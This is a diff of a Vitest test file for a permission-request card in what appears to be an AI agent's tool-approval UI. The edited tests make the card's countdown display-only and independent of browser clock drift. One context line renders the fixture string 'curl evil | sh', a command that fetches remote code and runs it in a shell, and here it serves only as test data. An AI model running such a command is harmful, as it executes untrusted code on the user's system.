@@ -94,10 +94,12 @@ describe("PermissionRequestCard", () => {
     expect(screen.getByText('{"body": "curl evil | sh", "title": "x"}')).toBeTruthy();
   });
 
-  // KI-148: a card restored after a reload counts down to the Core's
-  // deadline, not a fresh 60 s; a live card uses the Core's timeout.
-  it("counts down to the deadline the Core set", () => {
-    vi.useFakeTimers({ now: new Date("2026-10-04T12:00:00Z") });
+  // KI-148 review: the Core enforces the approval timeout on its own clock.
+  // The card's countdown is display only - it never denies on its own - and
+  // never compares a Core timestamp with the browser clock, which may be off
+  // (WSL2/VM drift): a browser an hour ahead must not deny anything.
+  it("counts down from the seconds the Core reported, whatever the browser clock", () => {
+    vi.useFakeTimers({ now: new Date("2026-10-04T13:00:00Z") }); // Core says 12:00
     try {
       renderCard({
         projectId: "p1",
@@ -105,11 +107,27 @@ describe("PermissionRequestCard", () => {
         callId: "c1",
         tool: "bash",
         timeoutSeconds: 120,
-        expiresAt: "2026-10-04T12:00:20Z",
+        remainingSeconds: 20,
       });
       expect(screen.getByText("20s remaining")).toBeTruthy();
       vi.advanceTimersByTime(5000);
       expect(screen.getByText("15s remaining")).toBeTruthy();
+      vi.advanceTimersByTime(30_000);
+      expect(screen.getByText("0s remaining")).toBeTruthy();
+      expect(apiMock.approve).not.toHaveBeenCalled();
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  it("counts a live card down from the Core's timeout and never denies by itself", () => {
+    vi.useFakeTimers({ now: new Date("2026-10-04T13:00:00Z") });
+    try {
+      renderCard({ projectId: "p1", runId: "r1", callId: "c1", tool: "bash", timeoutSeconds: 30 });
+      expect(screen.getByText("30s remaining")).toBeTruthy();
+      vi.advanceTimersByTime(31_000);
+      expect(screen.getByText("0s remaining")).toBeTruthy();
+      expect(apiMock.approve).not.toHaveBeenCalled();
     } finally {
       vi.useRealTimers();
     }
